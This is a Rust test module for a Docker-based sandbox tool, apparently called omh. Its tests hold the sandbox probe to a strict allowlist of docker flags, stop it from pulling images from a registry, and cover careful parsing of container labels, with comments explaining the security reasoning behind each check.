    /// Asserted positionally rather than by presence: root must come before
    /// the first `RUN`, because a `USER root` after the installs would satisfy
    /// `contains` and change nothing.
    #[test]
    fn the_stack_layer_installs_as_root() {
        let df = stack_dockerfile(&claude(), &["apt-get install -y gcc"], None);
        let line = |needle: &str| {
            df.lines()
                .position(|l| l.trim_start().starts_with(needle))
                .unwrap_or_else(|| panic!("missing `{needle}`:\n{df}"))
        };
        assert!(
            line("USER root") < line("RUN "),
            "the recipe runs before the layer takes root:\n{df}"
        );
    }

    /// The probe exists to answer a question about the *sandbox*, so it must be
    /// unable to see anything else. One bind mount of a host directory and
    /// `command -v cargo` starts answering about the developer's laptop — which
    /// is the exact confusion this whole feature was built to end, reintroduced
    /// one layer down where nothing would notice.
    ///
    /// Asserted as an invariant — *no mount of any spelling* — rather than
    /// against a fixed argument list, so a future flag cannot slip a mount in
    /// beside an assertion that still passes.
    #[test]
    fn the_toolchain_probe_can_see_nothing_but_the_image() {
        let args = probe_args("omh/x:latest", "#!/bin/sh\ntrue\n");
        // An **allowlist**, not a list of flags to forbid. Naming `-v`,
        // `--mount` and friends looks like an invariant and is a denylist: it
        // says nothing about `-w`, which `probe_args`' own doc also promises is
        // absent, nor about `--network`, `--privileged`, `-e` or `--userns`,
        // nor about whatever docker grows next. Everything between `run` and
        // the tag must be something this test knows about, so a new flag
        // arrives as a failure rather than as silence.
        let tag_at = args
            .iter()
            .position(|a| a == "omh/x:latest")
            .expect("the tag must be among the arguments");
        // Two entries, each earning its place: `--rm` leaves no container
        // behind, `--pull=never` refuses to fetch a tag that is not here. Both
        // are asserted for on their own below and in
        // `the_probe_never_fetches_the_image_it_asks_about`; the point of the
        // list is that nothing *else* may appear.
        for a in &args[1..tag_at] {
            assert!(
                a == "--rm" || a == "--pull=never",
                "an unexpected argument reached the probe — it must see nothing \
                 but the image, or it answers about the wrong machine: {args:?}"
            );
        }
        assert!(
            args[1..tag_at].contains(&"--rm".to_string()),
            "a diagnostic must leave no container behind: {args:?}"
        );
        assert!(
            args.contains(&"omh/x:latest".into()),
            "and it runs in the image the session will use: {args:?}"
        );
        assert_eq!(
            args.last().map(String::as_str),
            Some("#!/bin/sh\ntrue\n"),
            "the script is what runs, whole and unedited: {args:?}"
        );
    }

    /// The probe must never **fetch** the image it is asking about.
    ///
    /// `docker run <tag>` defaults to `--pull=missing`, so a tag with no local
    /// image is resolved against the default registry. omh's tags are
    /// `omh/<harness>:<hash>` — no registry prefix, so Docker Hub — and the
    /// hash is a pure function of the recipe, which means it is identical for
    /// every user on a given omh version and precomputable by anybody who has
    /// read this repository. A squatted `omh/*` namespace would therefore be
    /// pulled and run, and an `ENTRYPOINT` in a pulled image runs ahead of the
    /// `sh -c` argv this builds, so overriding the command does not save it.
    ///
    /// The window is real rather than theoretical: this probe is the one path
    /// that runs an image without `image::ensure*` having built it first.
    ///
    /// Asserted here as well as gated at the call site, on purpose. The gate is
    /// a caller's responsibility and the next caller may forget; this is a
    /// property of the command itself and travels with it.
    #[test]
    fn the_probe_never_fetches_the_image_it_asks_about() {
        let args = probe_args("omh/x:latest", "#!/bin/sh\ntrue\n");
        let tag_at = args.iter().position(|a| a == "omh/x:latest").unwrap();
        assert!(
            args[1..tag_at].iter().any(|a| a == "--pull=never"),
            "a missing image must be an error, never a registry fetch: {args:?}"
        );
    }

    #[test]
    fn build_reads_the_dockerfile_from_stdin() {
        let args = build_args("omh/x:latest", Path::new("/tmp/ctx"), &Kind::Base);
        assert_eq!(args[0], "build");
        assert!(args.contains(&"-t".into()) && args.contains(&"omh/x:latest".into()));
        assert!(
            args.windows(2).any(|w| w[0] == "-f" && w[1] == "-"),
            "Dockerfile must come from stdin so nothing is written to disk: {args:?}"
        );
    }

    // ── what a container says it was built from ─────────────────────────────

    /// Docker's own labels sit in the same map as omh's. Comparing the whole
    /// map would report drift for `maintainer` or anything a base image sets.
    #[test]
    fn only_omhs_own_records_are_read_back() {
        let Stamp::Read(got) = stamp_from(output(
            0,
            r#"{"omh.image":"omh/claude:ab","maintainer":"nodejs"}"#,
            "",
        )) else {
            panic!("a readable stamp is read");
        };
        assert_eq!(got.len(), 1);
        assert_eq!(got.get("omh.image").unwrap(), "omh/claude:ab");
    }

    /// Docker prints the bare word `null` for a container carrying no labels at
    /// all — which is every session started before omh stamped them. Treating
    /// that as a parse error would be indistinguishable from a broken daemon.
    #[test]
    fn a_container_with_no_labels_reads_as_none_rather_than_an_error() {
        for said in ["null", "{}"] {
            assert_eq!(
                stamp_from(output(0, said, "")),
                Stamp::Read(Default::default()),
                "`{said}` is a container with nothing stamped on it"
            );
        }
    }

    /// An answer omh cannot parse is an answer it cannot verify — and until
    /// this test's own rationale was rewritten, that meant *restart the
    /// container*.
    ///
    /// It used to read: "the caller treats *nothing recorded* as drift — which
    /// restarts the container. That is the safe direction." It is not the safe
    /// direction. A restart is `docker rm -f` on a container that may have an
    /// agent working inside it, chosen on the strength of output nobody
    /// understood, and `drift` announced it as *"it predates this check"* —
    /// a reason omh invented. Refusing is the safe direction.
    #[test]
    fn an_unreadable_answer_is_not_mistaken_for_a_container_with_no_labels() {
        for said in ["", "<html>error</html>"] {
            let answered = stamp_from(output(0, said, ""));
            assert!(
                matches!(&answered, Stamp::Unknown(_)),
                "`{said}` is not a container that predates the check: {answered:?}"
            );
        }
    }

    /// Values carry newlines — the mount list is one per line — and they have
    /// to survive the round trip or every launch reads as drift.
    #[test]
    fn a_multi_line_value_survives_the_round_trip() {
        let Stamp::Read(got) = stamp_from(output(
            0,
            r#"{"omh.mounts":"ro /a -> /b\nrw /c -> /d"}"#,
            "",
        )) else {
            panic!("a readable stamp is read");
        };
        assert_eq!(got.get("omh.mounts").unwrap().lines().count(), 2);
    }
}
